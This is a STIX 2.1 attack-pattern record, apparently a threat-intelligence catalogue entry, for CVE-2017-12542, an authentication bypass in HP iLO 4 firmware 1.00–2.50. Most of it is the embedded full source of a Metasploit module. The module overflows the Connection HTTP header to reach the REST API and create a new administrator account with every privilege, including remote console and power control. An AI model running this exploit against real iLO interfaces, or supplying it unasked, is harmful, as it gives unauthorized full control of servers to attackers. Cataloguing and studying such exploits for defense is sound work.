{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ec9a3352-6ef3-4ac3-88c4-bda721a2067a",
    "created": "2024-08-14T16:22:41.594222Z",
    "modified": "2024-08-14T16:22:41.594225Z",
    "name": "HP iLO 4 1.00-2.50 Authentication Bypass Administrator Account Creation",
    "description": " This module exploits an authentication bypass in HP iLO 4 1.00 to 2.50, triggered by a buffer overflow in the Connection HTTP header handling by the web server. Exploiting this vulnerability gives full access to the REST API, allowing arbitrary accounts creation.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/hp/hp_ilo_create_admin_account.rb",
            "external_id": "hp_ilo_create_admin_account.rb"
        },
        {
            "source_name": "reference",
            "url": "https://support.hpe.com/hpesc/public/docDisplay?docId=emr_na-hpesbhf03769en_us"
        },
        {
            "source_name": "reference",
            "url": "https://www.synacktiv.com/en/publications/hp-ilo-talk-at-recon-brx-2018.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP iLO 4 1.00-2.50 Authentication Bypass Administrator Account Creation',\n      'Description'    => %q{\n        This module exploits an authentication bypass in HP iLO 4 1.00 to 2.50, triggered by a buffer\n        overflow in the Connection HTTP header handling by the web server.\n        Exploiting this vulnerability gives full access to the REST API, allowing arbitrary\n        accounts creation.\n      },\n      'References'     =>\n        [\n          [ 'CVE', '2017-12542' ],\n          [ 'BID', '100467' ],\n          [ 'URL', 'https://support.hpe.com/hpesc/public/docDisplay?docId=emr_na-hpesbhf03769en_us' ],\n          [ 'URL', 'https://www.synacktiv.com/en/publications/hp-ilo-talk-at-recon-brx-2018.html' ]\n        ],\n      'Author'         =>\n        [\n          'Fabien Perigaud <fabien[dot]perigaud[at]synacktiv[dot]com>'\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2017-08-24',\n      'DefaultOptions' => { 'SSL' => true }\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('USERNAME', [true, 'Username for the new account', Rex::Text.rand_text_alphanumeric(8)]),\n        OptString.new('PASSWORD', [true, 'Password for the new account', Rex::Text.rand_text_alphanumeric(12)])\n      ])\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n                             'method' => 'GET',\n                             'uri'    => '/rest/v1/AccountService/Accounts',\n                             'headers' => {\n                               \"Connection\" => Rex::Text.rand_text_alphanumeric(29)\n                             }\n                             })\n    rescue\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.code == 200 and res.body.include? '\"Description\":\"iLO User Accounts\"'\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def run\n    print_status(\"Trying to create account #{datastore[\"USERNAME\"]}...\")\n\n    data = {}\n    data[\"UserName\"] = datastore[\"USERNAME\"]\n    data[\"Password\"] = datastore[\"PASSWORD\"]\n    data[\"Oem\"] = {}\n    data[\"Oem\"][\"Hp\"] = {}\n    data[\"Oem\"][\"Hp\"][\"LoginName\"] = datastore[\"USERNAME\"]\n    data[\"Oem\"][\"Hp\"][\"Privileges\"] = {}\n    data[\"Oem\"][\"Hp\"][\"Privileges\"][\"LoginPriv\"] = true\n    data[\"Oem\"][\"Hp\"][\"Privileges\"][\"RemoteConsolePriv\"] = true\n    data[\"Oem\"][\"Hp\"][\"Privileges\"][\"UserConfigPriv\"] = true\n    data[\"Oem\"][\"Hp\"][\"Privileges\"][\"VirtualMediaPriv\"] = true\n    data[\"Oem\"][\"Hp\"][\"Privileges\"][\"VirtualPowerAndResetPriv\"] = true\n    data[\"Oem\"][\"Hp\"][\"Privileges\"][\"iLOConfigPriv\"] = true\n\n    begin\n      res = send_request_cgi({\n                               'method' => 'POST',\n                               'uri'    => '/rest/v1/AccountService/Accounts',\n                               'ctype'  => 'application/json',\n                               'headers' => {\n                                 \"Connection\" => Rex::Text.rand_text_alphanumeric(29)\n                               },\n                               'data' => data.to_json()\n                             })\n    rescue Rex::ConnectionRefused\n    end\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection failed')\n    end\n\n    if res.body.include? 'InvalidPasswordLength'\n      fail_with(Failure::BadConfig, \"Password #{datastore[\"PASSWORD\"]} is too short.\")\n    end\n\n    if res.body.include? 'UserAlreadyExist'\n      fail_with(Failure::BadConfig, \"Unable to add login #{datastore[\"USERNAME\"]}, user already exists\")\n    end\n\n    unless res.code == 201\n      fail_with(Failure::UnexpectedReply, \"Unknown error while creating the user. Response: #{res.code}\")\n    end\n\n    print_good(\"Account #{datastore[\"USERNAME\"]}/#{datastore[\"PASSWORD\"]} created successfully.\")\n  end\nend\n\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2017-08-24"
}